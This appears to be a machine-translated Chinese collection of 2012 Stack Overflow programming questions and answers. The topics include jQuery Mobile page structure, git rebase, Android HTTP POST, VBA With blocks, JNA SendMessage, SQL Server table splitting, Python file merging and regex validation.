我是 Jquery Mobile 的新手，到目前为止，我搜索的任何示例都只包含一个用于整个应用程序的 html 页面，其中每个页面/屏幕都被定义为 div 标签，其中数据角色作为页面，带有一些页眉和页脚可选。根据用户操作，我们隐藏了一些 div（页面）并仅显示预期页面。此外，正如一些博客所写，这个多页模板似乎是标准设计。还有其他设计方法吗？我想要的是多个html页面，例如一个用于登录，一个用于家庭，一个用于联系等。否则很难理解/编码/调试问题，尤其是像我这样具有Java背景的人。那么，什么我想要的是某种带有 JQueryMobile 的 MVC 设计，例如每个视图/屏幕作为与一个 js（控制器）关联的单独 html。我们可以在 JqueryMobile 应用程序中有多个 html 页面吗？如果可能，如何在它们之间传递数据/维护会话？欢迎任何样品。提前致谢。

注意：我也不希望服务器端包含，可能应用程序包含 10 到 15 个屏幕，每个页面都会进行 Web 服务调用并获取一些数据并将其映射到 UI。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T10:58:04.030

正如上面提到的 jerone，jQuery Mobile 文档清楚地说明了

> 我们强烈建议将您的网站或应用程序构建为像这样的一系列单独页面，因为它更干净、更轻量级并且在没有 JavaScript 的情况下工作得更好。

请参阅[http://jquerymobile.com/demos/1.2.0/docs/pages/page-template.html](http://jquerymobile.com/demos/1.2.0/docs/pages/page-template.html)

因此，每个页面（可以是静态 HTML 文件或由脚本生成的任何内容（例如 PHP、Python 或其他））都是独立的，并且从一个页面到另一个页面的转换是使用 AJAX 调用完成的。

没有控制器之类的东西，除非您假设您的浏览器是一个！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T15:41:49.760

如果需要，您可以使用多个 html 文件。jQuery Mobile 将自动将这些包含在 AJAX 中：http: [//jquerymobile.com/demos/1.2.0/docs/pages/page-navmodel.html](http://jquerymobile.com/demos/1.2.0/docs/pages/page-navmodel.html)

无论如何，jQuery Mobile 推荐一个包含多个页面的大 html 文件。

来自[http://jquerymobile.com/demos/1.2.0/docs/pages/page-template.html](http://jquerymobile.com/demos/1.2.0/docs/pages/page-template.html)

> 这个模板是标准的 HTML 文档，里面有一个单一的“页面”容器，不像一个多页面模板里面有多个页面。**我们强烈建议将您的网站或应用程序构建为像这样的一系列单独页面**，因为它更干净、更轻量级并且在没有 JavaScript 的情况下工作得更好。

# git - git rebase 在当前分支之上

> ID：13514200
> 
> 赞同：3
> 
> 时间：2012-11-22T13:53:29.700
> 
> 标签：git, rebase

我正在尝试对我当前的分支进行交互式变基。即，我有一个修复错字的提交，我想在另一个提交之上进行“修复”。

有时这有效。有时这会给出格式奇怪的错误消息，例如：

```
# git rebase -i
You asked me to rebase without telling me which branch you
want to rebase against, and 'branch.myBranchName.merge' in
your configuration file does not tell me, either. Please
specify which branch you want to use on the command line and
try again (e.g. 'git rebase <upstream branch>').
See git-rebase(1) for details.

If you often rebase against the same branch, you may want to
use something like the following in your configuration file:
    [branch "myBranchName"]
    remote = <nickname>
    merge = <remote-ref>
    rebase = true

    [remote "<nickname>"]
    url = <url>
    fetch = <refspec>

See git-config(1) for details. 
```

如果我告诉 git 分支针对（当前分支）重新设置基准，它会失败并显示：

```
# git rebase -i myBranchName 
```

（我的编辑器打开'noop'，我相信这是git告诉我'no op'代替实际的错误消息）。我会相当编辑并得到：

```
Successfully rebased and updated refs/heads/myBranchName. 
```

如何在编辑器中查看当前分支的更改，并将其标记为修复？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T13:58:47.737

`git-rebase -i`是应用于多个提交的操作。

所以，如果你当前的分支是

A B C D

例如，您想要合并 A 和 C 提交，您需要运行（假设 A 是最高提交）

`git rebase -i HEAD~3`

这意味着“在当前分支上重新设置三个顶级提交”和“从提交 HEAD - 3 开始”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T13:59:06.857

也许你想要`git rebase -i --autosquash origin/myBranchName`？

git-rebase 的参数是重写历史的起点。它在当前签出的分支上运行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:15:32.853

我猜你的情况如下？

```
-A-B-C----D----(HEAD)
  \----Af 
```

`Af`作为修复提交`A`

你想让它变成

```
-(A+Af)-B-C-D--(HEAD) 
```

对于这种情况，我会尝试以下方法：

```
>> rebase <Af>          # where <Af> is the SHA1 of commit Af 
```

你的历史会变成

```
-A-Af-B-C-D----(HEAD) 
```

接着

```
>> rebase -i <A>^       # A^ is the commit that came before A 
```

它会向您展示交互式拾取/挤压视图，使您能够一起挤压`A`和挤压`Af`。

# android - Http Post 在 Android 中不起作用

> ID：13514201
> 
> 赞同：0
> 
> 时间：2012-11-22T13:53:31.790
> 
> 标签：android, http-post

我正在使用一个将 XML 数据作为 Web 服务的 android 应用程序。我的任务是通过使用 HTTP Post 发布值并检索数据并在列表视图中显示来添加数据。在发布时，我需要将其加密为 UTF-8 格式。

下面我给出了我的代码。

```
private String postSyncXML() {
    String url = strMainUrl + strSubUrl;
    HttpClient httpclient = new DefaultHttpClient();

    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
    nameValuePairs
            .add(new BasicNameValuePair("uid", strUniqueId));
    nameValuePairs.add(new BasicNameValuePair("first_name", strFirstName));
    nameValuePairs.add(new BasicNameValuePair("last_name", strLastName));
    nameValuePairs.add(new BasicNameValuePair("email", strEmail));
    nameValuePairs.add(new BasicNameValuePair("phone", strPhone));
    nameValuePairs.add(new BasicNameValuePair("notes", strNotes));
    nameValuePairs.add(new BasicNameValuePair("is_sms", strIsSms));
    nameValuePairs.add(new BasicNameValuePair("is_email", strIsEmail));

    UrlEncodedFormEntity form;
    try {
        form = new UrlEncodedFormEntity(nameValuePairs, "UTF-8");
        HttpPost httppost = new HttpPost(url);
Log.d("", "Add Guest URL "+url);
        httppost.setEntity(form);

        HttpResponse response = (HttpResponse) httpclient.execute(httppost);
        HttpEntity resEntity = response.getEntity();
        String resp = EntityUtils.toString(resEntity);
        Log.i("Method call", "postSyncXML srv response:" + resp);
        return resp;
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    } catch (ClientProtocolException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
    return null;
} 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-18T17:10:00.917

```
HttpClient httpclient = new DefaultHttpClient();
HttpPost httppost = new HttpPost("http://192.168.192.131/");

try {
    StringEntity se = new StringEntity( "<aaaLogin inName=\"admin\" inPassword=\"admin123\"/>", HTTP.UTF_8);
    se.setContentType("text/xml");
    httppost.setEntity(se);

    HttpResponse httpresponse = httpclient.execute(httppost);
    HttpEntity resEntity = httpresponse.getEntity();
    tvData.setText(EntityUtils.toString(resEntity));

} catch (ClientProtocolException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
```

[Android，通过 HTTP POST 方法发送和接收 XML](https://stackoverflow.com/questions/5013373/android-send-and-receive-xml-via-http-post-method)

# vba - 关于With语句的一些问题

> ID：13514202
> 
> 赞同：0
> 
> 时间：2012-11-22T13:53:33.827
> 
> 标签：vba, excel

我正在试验一些将数据写入表格的用户表单代码（代码是有效的）。ST 是一些命名范围：

```
With Range(ST)
    .Cells(Range(ST).Count).Offset(1, 0).EntireRow.Insert
    .Resize(Range(ST).Rows.Count + 1).Name = ST
    .Cells(Range(ST).Rows.Count, 1) = Range(ST).Rows.Count - 1
    .Cells(Range(ST).Rows.Count, 2) = TextBox2.Text
End With 
```

我的问题是：

为什么我可以如下重写第二行和第三行而不影响最终结果

```
 .Cells(.Count).Offset(1, 0).EntireRow.Insert
    .Resize(.Rows.Count + 1).Name = ST 
```

但是改变其他行，例如

```
 .Cells(.Rows.Count, 2) = TextBox2.Text 
```

导致表上应该包含的条目`TextBox2.Text`返回一个空白单元格。

谢谢（也欢迎对代码进行任何其他杂项评论）

编辑：

不幸的是，我发布这个问题正是因为它不像你们说的那样表现。详细阅读帮助文件后，我相信这行：

“表达式在进入块时被评估一次。您不能从 With 块中重新分配表达式。”

意味着：

```
.Resize(Range(ST).Rows.Count + 1).Name = ST 
```

是问题所在，并采取了两条线：

```
.Cells(Range(ST).Count).Offset(1, 0).EntireRow.Insert
.Resize(Range(ST).Rows.Count + 1).Name = ST 
```

在 with 块之外，一切都按预期工作！我是否正确解释了这一点？如果我上传文件会有人感兴趣吗？（玩具实验代码不到几行）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:01:23.920

该`With ... End`声明非常有用；它有助于更​​快的编码和程序执行。更多你可以[在这里阅读](http://msdn.microsoft.com/en-us/library/wc500chb.aspx)

关于你的问题；您应该能够在语句`Range(ST)`内的所有行中删除。`With ... End`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:02:39.727

根据我的评论，您可以通过以下任何一种方式编写代码。他们都会做同样的事情。

```
With Range(ST)
    .Cells(Range(ST).Count).Offset(1, 0).EntireRow.Insert
    .Resize(Range(ST).Rows.Count + 1).Name = ST
    .Cells(Range(ST).Rows.Count, 1) = Range(ST).Rows.Count - 1
    .Cells(Range(ST).Rows.Count, 2) = TextBox2.Text
End With 
```

或者

```
With Range(ST)
    .Cells(.Count).Offset(1, 0).EntireRow.Insert
    .Resize(.Rows.Count + 1).Name = ST
    .Cells(.Rows.Count, 1) = .Rows.Count - 1
    .Cells(.Rows.Count, 2) = TextBox2.Text
End With 
```

或者

```
With Range(ST)
    Dim nCount As Long

    nCount = .Rows.Count

    .Cells(.Count).Offset(1, 0).EntireRow.Insert
    .Resize(nCount + 1).Name = ST
    .Cells(nCount, 1) = nCount - 1
    .Cells(nCount, 2) = TextBox2.Text
End With 
```

# java - 在java中使用来自user32.dll的SendMessage和jna - 错误

> ID：13514213
> 
> 赞同：1
> 
> 时间：2012-11-22T13:53:56.227
> 
> 标签：java, winapi, jna, sendmessage, user32

我尝试使用：

```
LRESULT WINAPI SendMessage(_In_  HWND hWnd, _In_  UINT Msg,
                           _In_  WPARAM wParam, _In_  LPARAM lParam); 
```

在带有 jna 的 Java 中，我不断收到错误消息：

```
Exception in thread "AWT-EventQueue-0" java.lang.UnsatisfiedLinkError: Error looking up function 'SendMessage' 
```

这是我的界面：

```
public interface User32 extends StdCallLibrary {
Pointer GetForegroundWindow();
int SendMessage(Pointer hWnd, int msg, int num1, int num2); 
```

我这样称呼它：

```
Pointer hW = user32.GetForegroundWindow();
user32.SendMessage(hW, 0x0201, 0, 0);
user32.SendMessage(hW, 0x0202, 0, 0); 
```

hWnd 是对的。我的错误在哪里？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-22T14:08:43.853

JNA 在 user32.dll 中找不到函数“SendMessage”，因为没有导出该名称的函数。

这是因为 SendMessage 是一个旧名称，它被其他编译器自动映射到匹配的 ANSI 或 UNICODE 版本的函数 -`SendMessageA`和`SendMessageW`.

使用显示 DLL 导出函数的工具，例如 DependencyWalker，您可以看到 Windows 7 的 user32.dll 仅知道这两个函数`SendMessageA`，`SendMessageW`但不知道`SendMessage`.

您使用的函数定义看起来像 ANSI 版本，因此您应该`SendMessageA`改用。

顺便提一句。如果您使用 32 位或 64 位 Java 和 user32.dll，则没有任何区别。我写的对两个版本都是正确的。

# sql - 作为数据库规范化过程的一部分，最快的查询来分离表的一半列

> ID：13514214
> 
> 赞同：-1
> 
> 时间：2012-11-22T13:53:57.137
> 
> 标签：sql, sql-server, sql-server-2012

我使用 SQL Server 2012。我有一个巨大的表 (30Gb) 和一个非常基本的 PC 来处理这么多的数据。我在此表中有一个列（我们将其命名为 COL1），对于该列，每大量列只有一个唯一值。我想首先将这些重复的数据移动到单独的表中，其中只存储唯一值。现在的问题是如何以最快的方式做到这一点。为按 COL1 分组的每个列选择不同值的计数花了我大约 5 个小时，现在我知道哪些列需要从表中移开，但不想再等 6-8 个小时。我在 COL1 上有一个非聚集索引，在记录 id 上有一个主键，如果您的解决方案在创建其他一些索引时会更好地工作，请告诉我。

表有 5000 万行和大约 100 列。大约 40 列包含许多公司的时间序列数据，大约 60 列包含每个公司的描述性数据，这些都是重复的。COL1 是公司的唯一标识。因此，我想将时间序列数据与公司描述数据分开，这样公司描述将在一个单独的表中，并且每个公司有 1 行。数据集中大约有 22,000 个唯一的公司 ID。大多数公司描述列都是 varchar。

我找不到只为每个 COL1 值取 TOP 1 元素的方法。我猜其他选项将需要更长的时间来执行。

我能想到的查询示例：

```
select distinct tbl.COL1, tbl.add1, tbl.add2, other columns with duplicates...
into newtable
from tbl

select COL1, min(add1), min(add2), min of other columns with duplicates...
into newtable
from tbl
group by COL1 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:21:56.577

在 Col1 上创建聚集索引 - 如果您没有聚集索引，则您的表是一个堆，并且每个查询都将涉及表扫描。在要返回的行上创建覆盖索引。选择 DISTINCT（不包括 col1）应该会产生您想要的结果。仅按您喜欢的排序顺序插入具有聚集索引的表中。

假设您的数据是不变的，您可以循环 WHILE 并插入您在 N*1000 和 (N+1)*1000 -1 之间取值的位置

添加有助于返回数据的任何其他索引

# java - MySQL 和 Java 中的多线程编程

> ID：13514217
> 
> 赞同：0
> 
> 时间：2012-11-22T13:54:01.580
> 
> 标签：java, mysql, multithreading

我有一个使用线程池使用多线程的 Java 程序。每个线程都会做一些选择和插入语句。数据库是 MySQL InnoDB。

我计划启动几个运行屏幕（6 个进程），每个进程都将使用多线程。我的问题是：

1) 我可以为池定义多少个线程？由于我的处理器是 Core i7-2640M，我是否限制为最多 4 个线程？

2）我应该担心有关数据库完整性的任何事情吗？我没有对程序中的任何内容使用同步（没有必要），但我担心 DB 插入语句。我是否需要同步它们，否则 MySQL 会知道我在主函数中的每个进程都有一个连接。

请给我提意见。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:00:51.603

从 2) 开始，只要您注意隔离级别，就可以保证数据库的完整性：如果您的插入不是原子的，或者您的选择关心来自其他线程的插入定时，请使用事务。

关于 1) 最佳线程数在很大程度上取决于这些线程的作用：等待远程数据库事务完成的线程肯定不需要可用的内核。我建议您从核心数的 4 倍开始，然后从那里开始测试。根据您的操作系统，您还需要对进程与线程进行基准测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:38:01.020

**关于线量**

如果您愿意，您可以在一个内核上拥有 100 个线程。操作系统将[安排](http://en.wikipedia.org/wiki/Scheduling_%28computing%29)它们，以便每个都有时间运行。一台正在运行的计算机已经有几百个活动线程/进程，其中大多数只是空闲的（Windows 任务管理器在某处显示该信息）。

CPU 中的每个内核一次可以运行 1 个线程。[i7-2640M](http://ark.intel.com/products/53464/Intel-Core-i7-2640M-Processor-4M-Cache-up-to-3_50-GHz)有两个物理内核，但每个都执行超线程（=“并行”在 1 个物理内核上运行 2 个线程），因此它提供 4 个内核供您使用。

要近似最佳线程数，您需要知道线程的活跃程度。如果每个线程一直在没有睡眠/等待的情况下运行，它会占用一个完整的核心。在这种情况下，您不应使用超过 4 个线程，因为它们只会相互阻塞。在活动线程之间切换需要一些 CPU 时间，因此更多线程将导致整体性能降低。

如果您的线程正在等待，您需要计算出活跃度的百分比。例如，每个屏幕线程大部分时间都在等待用户输入。每个输入需要 1 秒的时间来处理，您预计每个屏幕每分钟将获得 30 个事件。这意味着您每分钟需要大约 30 秒。您每分钟有 4 x 60 秒，因此您的最佳线程/屏幕数约为 8。

如果您有一个执行程序来运行小任务，每个任务都在几秒钟内完成，那么使用与您拥有的内核一样多的线程。执行程序可以将小任务分配给线程，这样您就可以恢复到每个内核大约 100% 的负载。

**关于数据库完整性**

见欧根·瑞克。事务是确保原子修改的方法（= 没有其他进程可以看到事务开始和结束之间的状态）

# ubuntu - cucumberl(Erlang) / Ubuntu 错误，无法执行 .feature 文件

> ID：13514218
> 
> 赞同：1
> 
> 时间：2012-11-22T13:54:03.360
> 
> 标签：ubuntu, erlang

我遇到了来自[https://github.com/membase/cucumberl](https://github.com/membase/cucumberl)的 cucumberl问题，它在运行 .feature 文件源方面存在一些已知问题：[https ://github.com/membase/cucumberl/issues/13](https://github.com/membase/cucumberl/issues/13)

这里有谁知道对此的潜在解决方案？

我得到的错误：

```
cucumberl:run("./examples/simple_sample/features/simple_sample.feature").
** exception throw: {error,nofile}
     in function  cucumberl:run_tree/2 (src/cucumberl.erl, line 41) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-24T22:45:38.797

异常`{error,nofile}`意味着应用程序试图打开文件但找不到它。最可能的原因是它使用了一些其他路径作为根，而不是你想象的。尝试使用文件的绝对路径而不是相对路径。

# java - Java 将 HTML 应用于选定的文本

> ID：13514223
> 
> 赞同：2
> 
> 时间：2012-11-22T13:54:25.300
> 
> 标签：java, html, jtextpane, jeditorpane

我想知道是否有一种方法可以使用荧光笔将基本 HTML 应用到文本窗格或文本编辑器。我的目标是基本上做一个使用基本 HTML 的文本编辑器。例如，用户突出显示某些文本的一部分并单击一个按钮，我希望它变为粗体，例如，使用 html 但不显示标签或任何内容，仅以粗体显示选定的文本。另外我想知道使用文本窗格或编辑器窗格是否更好，以及为什么。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-28T14:59:28.083

无论如何，您必须为您的 JTextPane 设置一个 HTMLDocument。然后，您可以使用 HTMLEditorKit 和 HTMLDocument 的功能来实现您想要的。例如，您可以使用：

```
 insertHTML(jtp.getDocument(), jtp.getSelectionStart(), "<b>"+getSelectedText()+"</b>", 0, 0, HTML.Tag.B); 
```

来自 HTMLEditorKit。类似的东西（我没有尝试过代码）

# ios - 在 mainviews 层上方添加 Subview

> ID：13514232
> 
> 赞同：4
> 
> 时间：2012-11-22T13:55:02.647
> 
> 标签：ios, xcode, uiview, calayer, subview

我无法在其父视图的 CALayer 上方添加子视图。

我试图附上一张图片来说明我的意思，但我没有足够的声誉，所以这里是图片的链接：

[http://imageshack.us/photo/my-images/843/img0219u.png/](http://imageshack.us/photo/my-images/843/img0219u.png/)

子视图的一部分被父视图边框遮挡。

如何使子视图出现在父视图层的顶部？

任何帮助表示赞赏。

如果有帮助，这是我的代码：

添加图层的代码：

```
 UIView *student = [[UIView alloc] initWithFrame:CGRectMake(50, 50, 100, 100)];
    student.backgroundColor = [UIColor grayColor];

    CALayer *studentLayer = [[CALayer alloc] init];
    studentLayer.borderColor = [UIColor grayColor].CGColor;
    studentLayer.borderWidth = 5;

    student.layer.borderColor = studentLayer.borderColor;
    student.layer.borderWidth = studentLayer.borderWidth; 
```

添加子视图的代码：

```
 UILabel *ilp = [[UILabel alloc] initWithFrame:(CGRectMake(-20, -10, 40, 20))];
    ilp.text = @"ILP";
    ilp.backgroundColor = [UIColor yellowColor];
    ilp.textColor = [UIColor blackColor];
    ilp.textAlignment = NSTextAlignmentCenter;

    [student addSubview:ilp]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:06:46.753

到目前为止这是不可能的，我能想到的最好的解决方案是将子视图及其父视图都添加到另一个视图中，而不仅仅是重新排序两个子视图，以便您的子视图位于另一个视图及其边界之上。

希望有帮助！

# python - 查找文本列表并在匹配字段处替换

> ID：13514234
> 
> 赞同：1
> 
> 时间：2012-11-22T13:55:06.120
> 
> 标签：python, unix, replace

好吧，我接受标题对我的问题含糊不清，我无法以更易于理解的方式表达。我是编程新手，我的技术术语仍在发展中。

我有两个文件，文件`A`看起来像：

```
CHROM   POS ID  AGM12   AGM14   AGM15   AGM18 ..
1   14930   rs150145850     0/0 1/1 0/0  0/0 ..
1   14933   rs138566748 0/0 0/0 0/0  0/0 ..
1   63671   rs116440577 0/1 0/0 0/0  0/0 ..
2   808922  rs6594027   0/0 0/0 0/0  0/1 ..
2   753474  rs2073814   1/0 0/0 0/1  0/0 ..
3   753405  rs61770173  0/0 1/1 0/0  1/0 ..
...
...
... 
```

文件`B`看起来像：

```
CHROM   POS rsID    Sample_ID
1   14930   rs150145850 AGM15
2   808922  rs6594027   AGM18
3   753405  rs61770173  AGM12
...
...
... 
```

我希望使用 File 中的 POS 字段信息（第 2 列）将 File中`B`相应的内容替换为.`Sample_ID``A``NA`

例如：输出应该看起来像

```
CHROM   POS ID  AGM12   AGM14   AGM15   AGM18
1   14930   rs150145850     0/0 1/1 NA   0/0
1   14933   rs138566748 0/0 0/0 0/0  0/0
1   63671   rs116440577 0/1 0/0 0/0  0/0
2   808922  rs6594027   0/0 0/0 0/0  NA
2   753474  rs2073814   1/0 0/0 0/1  0/0
3   753405  rs61770173  NA  1/1 0/0  1/0 
```

我怎么能在 Python 或 Unix 中做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T15:13:36.330

这是使用该[`csv`](http://docs.python.org/2/library/csv.html)模块的版本（我假设您的列是制表符分隔的）。

```
import csv
import collections

a = 'path/to/a'
b = 'path/to/b'
output = 'output/path'

pos = collections.defaultdict(list)

with open(b) as csvin:
    reader = csv.DictReader(csvin, delimiter='\t')
    for line in reader:
        pos[line['POS']].append(line['Sample_ID'])

with open(a) as csvin, open(output, 'wb') as csvout:
    reader = csv.DictReader(csvin, delimiter='\t')
    writer = csv.DictWriter(csvout, fieldnames=reader.fieldnames, delimiter='\t')
    writer.writeheader()
    for line in reader:
        fields = pos.get(line['POS'], [])
        for field in fields:
            line[field] = 'NA'
        writer.writerow(line) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:20:38.713

试试这个。

```
def method(file1, file2, fileout):
    d1, d2, headers = {}
    i = 1
    with open(file1) as f1:  
        for line in f1:
            vars = line.split('\t') #i am assuming tab seperated
            d1[vars[1]] = [vars[0]] + vars[2:]
    with open(file2) as f2:
        for line in f2:
            vars = line.split('\t')
            d2[vars[1]] = vars[2]
    for header in d1['POS']:
        headers[header] = i
        i+=1
    with open(fileout, 'w') as fo:
        fo.write("%s\tPOS\t%s\n" % (d1['POS'][0], "\t".join(d1['POS'][1:]))
        del d1['POS']         
        for key, values in d1.items():
            if key in d2:
                d1[key][headers[d2[key]]] = "NA"
            fo.write("%s\t%s\t%s\n" % (values[0], key, "\t".join(values[1:]))) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:29:18.433

如果您不介意安装一些软件包，您可以通过以下方式巧妙地做到这一点`pandas`：

```
A = pandas.DataFrame.from_csv("A.txt", sep="\t", index_col=(0,1))
B = pandas.DataFrame.from_csv("B.txt", sep="\t", index_col=(0,1))

A.join(B) # the resulting dataset 
```

当然，你必须拿起`pandas`才能做到这一点。

# facebook - 新页面加载时，Facebook iframe 不会置顶

> ID：13514235
> 
> 赞同：-1
> 
> 时间：2012-11-22T13:55:33.033
> 
> 标签：facebook, iframe, facebook-iframe

嗨，我终生无法找到解决方案。我在 ehre 上搜索并尝试了针对此问题的所有建议解决方案...

facebook/iframe 组合似乎没有任何作用

正如这个人所说 不幸的是，它不起作用，以及我尝试的许多其他解决方案： onload="window.parent.scroll(0,0);", document.getElementById("someTopDivId").scrollIntoView(); , $(window/html/body).scrollTop(0);... Facebook iframe 组合似乎没有任何作用:( – BBog 2011-12-08 9:40

从这里 [滚动到 iframe 内新打开页面的顶部](https://stackoverflow.com/questions/8427742/scrolling-to-the-top-of-a-new-opened-page-inside-an-iframe)

问题是当用户在 facebook 选项卡上到达第 1 页的底部（在 iframe 内），然后单击“下一页”，然后将第 2 页加载到 iframe 但在同一位置，例如在底部而不是顶部迫使用户向上滚动到顶部以继续阅读第 2 页

有许多类似的问题，但似乎无法找到任何人知道如何解决这个问题的解决方案？

会认为它是一个相当大的一个，因为 iframe 在 FB 上被许多人以这种方式使用，肯定有人已经弄清楚了吗？

感谢任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T13:57:58.453

只需使用 FB JS SDK 的 FB.Canvas.ScrollTo。

请参阅[http://developers.facebook.com/docs/reference/javascript/FB.Canvas.scrollTo/](http://developers.facebook.com/docs/reference/javascript/FB.Canvas.scrollTo/)了解更多信息。

# java - 连接到 LDAPS 的问题

> ID：13514236
> 
> 赞同：1
> 
> 时间：2012-11-22T13:55:35.583
> 
> 标签：java, ssl, ldap

当我连接到 LDAPS 时，我得到以下异常：

```
Exception in thread "main" java.net.SocketException: Connection reset
    at java.net.SocketInputStream.read(SocketInputStream.java:189)
    at java.net.SocketInputStream.read(SocketInputStream.java:121)
    at sun.security.ssl.InputRecord.readFully(InputRecord.java:312)
    at sun.security.ssl.InputRecord.read(InputRecord.java:350)
    at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:927)
    at sun.security.ssl.SSLSocketImpl.waitForClose(SSLSocketImpl.java:1723)
    at sun.security.ssl.HandshakeOutStream.flush(HandshakeOutStream.java:122)
    at sun.security.ssl.Handshaker.kickstart(Handshaker.java:909)
    at sun.security.ssl.SSLSocketImpl.kickstartHandshake(SSLSocketImpl.java:1439)
    at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1304)
    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1355)
    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1339)
    at InstallCert.main(InstallCert.java:72) 
```

我正在使用以下代码进行连接：

```
InputStream in = new FileInputStream(file);
KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
ks.load(in, passphrase);
in.close();

SSLContext context = SSLContext.getInstance("TSL");
TrustManagerFactory tmf =
    TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
tmf.init(ks);
X509TrustManager defaultTrustManager = (X509TrustManager)tmf.getTrustManagers()[0];
SavingTrustManager tm = new SavingTrustManager(defaultTrustManager);
context.init(null, new TrustManager[] {tm}, null);
SSLSocketFactory factory = context.getSocketFactory();

System.out.println("Opening connection to " + host + ":" + port + "...");
SSLSocket socket = (SSLSocket)factory.createSocket(host, port);
socket.setSoTimeout(10000);
try {
    System.out.println("Starting SSL handshake...");
    socket.startHandshake();
    socket.close();
    System.out.println();
    System.out.println("No errors, certificate is already trusted");
} catch (SSLException e) {
    System.out.println();
    e.printStackTrace(System.out);
} 
```

端口是：636。域控制器在 Windows 2012 上。当我连接到 Windows 2008 上的域控制器时没有问题，它工作正常。

这是否意味着 LDAP 不使用 SSL？

# objective-c - 从另一个按钮停止 IBAction Objective-C

> ID：13514245
> 
> 赞同：-2
> 
> 时间：2012-11-22T13:56:09.223
> 
> 标签：objective-c, uibutton, ibaction

我不知道如何停止 IBAction。我需要什么：我按下按钮，然后调用运行大约 5 分钟的 IBAction。我想让取消按钮在按下时从第一个按钮停止 IBAction。

我该怎么做呢？

代码：

```
- (IBAction)download:(id)sender {

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^ {

        // Determile cache file path
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);

        for (i=0;i<=7;i++) {

            //Updating progressView and progressLabel

            dispatch_async(dispatch_get_main_queue(), ^ {
                progressSlider.progress = (float)i/(float)299;
                progressLabel.text = [NSString stringWithFormat:@"Загружено: %d из 299",i];
            });

            NSString *filePath = [NSString stringWithFormat:@"%@/avto-0-%d.html", [paths objectAtIndex:0],i];

            // Download and write to file
            NSString *mustUrl = [NSString stringWithFormat:@"http://www.mosgortrans.org/pass3/shedule.php?type=avto&%@", [listOfAvtoUrl objectAtIndex:i]];
            NSURL *url = [NSURL URLWithString:mustUrl];
            NSData *urlData = [NSData dataWithContentsOfURL:url];

            [urlData writeToFile:filePath atomically:YES];

        }

    });

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:00:14.997

单击时调用另一个在单独线程中运行代码的函数`IBAction`。现在，您可以根据需要停止/取消线程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:06:51.090

创建一个名为 isCancelled 的 BOOL 变量。当您单击另一个按钮时，将 isCancelled 设置为 YES。在你的下载函数中设置这个 for 循环：

```
if (isCancelled)return; 
```

# java - 值小于 99999999.9999

> ID：13514248
> 
> 赞同：-8
> 
> 时间：2012-11-22T13:56:16.543
> 
> 标签：java, regex

```
Pattern regex = Pattern.compile("^\\d{0,8}\\.\\d{0,4}$"); 
```

正在工作，但如果我输入值，例如 5000，它应该可以工作。基本上有效值应该等于或小于“99999999.9999”。

如果值为“123456789”，则无效。

小数点不是强制性的。

请帮忙。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T13:58:53.270

由于每个浮点数都有许多不同的表示形式（想想`100`, `100.0`,`1e2`等），我建议将数字解析为 a `double`，然后使用数字比较来确定它是否在所需的范围内。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-22T13:57:44.777

使小数部分可选

```
^\d{0,8}(\.\d{0,4})?$ 
```

但我认为你的意思是直到只有`12345678`但如果不是

```
^\d{0,9}(\.\d{0,4})?$ 
```

但我建议`1`在小数点后至少有一个数字，所以如果用户尝试输入`123.`它将失败

```
^\d{0,9}(\.\d{1,4})?$ 
```

# javascript - JavaScript 自动转换一些特殊字符

> ID：13514250
> 
> 赞同：7
> 
> 时间：2012-11-22T13:56:17.940
> 
> 标签：javascript, jquery, character-encoding

我需要用 JS 提取一个与位置相关的 HTML 子字符串。我存储 HTML 编码的特殊字符。

例如：

**HTML**

```
<div id="test"><p>l&ouml;sen &amp; gr&uuml;&szlig;en</p></div>​ 
```

**文本**

```
lösen & grüßen 
```

我的问题在于 JS 部分，例如，当我尝试提取片段时 `lö`，片段的起始位置`3`和结束位置`9`在`<div>`块内。JS 似乎在内部转换了一些特殊字符，因此从`3`to的计数`9`被错误地解释为“ `lösen`”而不是“ `l&ouml;`”。其他特殊字符（如`&amp;`）不受此影响。

